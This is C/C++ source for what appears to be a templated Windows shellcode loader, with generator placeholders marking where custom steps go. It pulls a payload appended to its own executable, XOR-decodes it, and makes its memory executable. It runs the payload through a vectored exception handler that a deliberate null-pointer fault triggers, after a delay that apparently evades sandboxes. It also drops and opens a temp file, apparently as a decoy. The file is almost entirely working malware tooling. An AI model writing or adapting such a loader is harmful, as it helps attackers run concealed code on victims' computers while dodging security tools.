#include <windows.h>
#include <shlwapi.h>

int read_pe_slot(int index, void *pdata) {
	HANDLE h_file = NULL;
	DWORD num_read = 0;
	WCHAR file_name[MAX_PATH];
	DWORD data_size=0;
	DWORD file_tail=0;
	
	GetModuleFileNameW(NULL, file_name, MAX_PATH);
	h_file = CreateFileW(file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	file_tail = SetFilePointer(h_file, 0, NULL, FILE_END);
	
	SetFilePointer(h_file, file_tail-4, NULL, FILE_BEGIN);
	ReadFile(h_file, &data_size, 4, &num_read, NULL);
	
	int slot_cnt = 0;
	while(data_size) {
		SetFilePointer(h_file, -(data_size+8), NULL, FILE_CURRENT);
		ReadFile(h_file, &data_size, 4, &num_read, NULL);
		++slot_cnt;
	}
	
	if(0<=index && index<slot_cnt) {
		SetFilePointer(h_file, file_tail-4, NULL, FILE_BEGIN);
		ReadFile(h_file, &data_size, 4, &num_read, NULL);
		
		for(int iter=slot_cnt-1; iter>index; --iter) {
			SetFilePointer(h_file, -(data_size+8), NULL, FILE_CURRENT);
			ReadFile(h_file, &data_size, 4, &num_read, NULL);
		}
		SetFilePointer(h_file, -(data_size+4), NULL, FILE_CURRENT);
		if(pdata)
			ReadFile(h_file, pdata, data_size, &num_read, NULL);
	} else {
		data_size = 0;
	}
	
	
	CloseHandle(h_file);
	return data_size;
}

PVOID veh_op(PVOID p_veh) {
    return AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)p_veh);
}

void encode(LPVOID buf, int size, const char* key, int key_len) {
    unsigned char* p = (unsigned char*)buf;
    for (int i = 0; i < size; ++i) {
        p[i] ^= key[i % key_len];
    }
}

void decode(LPVOID buf, int size, const char* key, int key_len) {
    encode(buf, size, key, key_len);
}

DWORD rw(PVOID base, SIZE_T size=1) {
    DWORD old_prot;
    VirtualProtect(base, size, PAGE_READWRITE, &old_prot);
    return old_prot;
}

DWORD rx(PVOID base, SIZE_T size=1) {
    DWORD old_prot;
    VirtualProtect(base, size, PAGE_EXECUTE, &old_prot);
    return old_prot;
}

DWORD rwx(PVOID base, SIZE_T size=1) {
    DWORD old_prot;
    VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &old_prot);
    return old_prot;
}

PVOID alloc(SIZE_T size) {
    return VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
}

void exec(PVOID base) {
    ((void (*)())base)();
}

void write_temp_file_and_exec(unsigned char *file_data, int file_data_len, LPCWSTR ext_name) {
	WCHAR szTempFileName[MAX_PATH];
    WCHAR lpTempPathBuffer[MAX_PATH];
	WCHAR szModuleFileName[MAX_PATH];
	DWORD number_of_bytes_written;
	HANDLE h_file;
	
	GetTempPathW(MAX_PATH, lpTempPathBuffer);
	GetModuleFileNameW(NULL, szModuleFileName, MAX_PATH);
	PathStripPathW(szModuleFileName);
	PathRemoveExtensionW(szModuleFileName);
	lstrcpyW(szTempFileName, lpTempPathBuffer);
	lstrcatW(szTempFileName, szModuleFileName);
	lstrcatW(szTempFileName, ext_name);
	
	h_file = CreateFileW((LPWSTR)szTempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(h_file, file_data, file_data_len, &number_of_bytes_written, NULL);
	ShellExecuteW(NULL, NULL, szTempFileName, NULL, NULL, SW_SHOWNORMAL);
	CloseHandle(h_file);
}

void handler() {
	static int g_flag = 0;
	if(!g_flag) {
		g_flag = 1;
		
		// do something before exec shellcode
		@@@slot_2@@@
		
		DWORD sc_size = read_pe_slot(0, NULL);
		PVOID p_sc = alloc(sc_size);
		read_pe_slot(0, p_sc);
		WaitForSingleObject(GetCurrentProcess(), @@@slot_0@@@);
		// decode shellcode
		@@@slot_1@@@
		rx(p_sc, sc_size);
		exec(p_sc);
	}
}

int main() {
    veh_op((PVOID)handler);
    int *p = nullptr;
    *p = @@@slot_3@@@;
    return 0;
} 